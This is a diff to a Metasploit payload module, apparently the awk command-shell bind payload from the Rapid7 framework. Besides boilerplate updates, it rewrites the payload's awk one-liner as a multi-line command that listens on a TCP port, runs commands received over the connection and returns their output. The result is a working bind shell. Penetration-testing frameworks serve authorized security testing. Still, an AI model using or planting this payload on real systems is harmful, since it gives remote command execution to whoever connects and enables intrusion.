@@ -1,16 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/bind_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit4
+module MetasploitModule
 
-  CachedSize = 96
+  CachedSize = 140
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -43,14 +39,28 @@ module Metasploit4
   # Constructs the payload
   #
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
   # Returns the command string to use for execution
   #
   def command_string
-    "awk 'BEGIN{s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
+    awkcmd = <<~AWK
+      awk 'BEGIN{
+        s=\"/inet/tcp/#{datastore['LPORT']}/0/0\";
+        do{
+          if((s|&getline c)<=0)
+            break;
+          if(c){
+            while((c|&getline)>0)print $0|&s;
+            close(c)
+          }
+        } while(c!=\"exit\")
+        close(s)
+      }'
+    AWK
+    awkcmd.gsub!("\n",'').gsub!('  ', '')
   end
 
 end
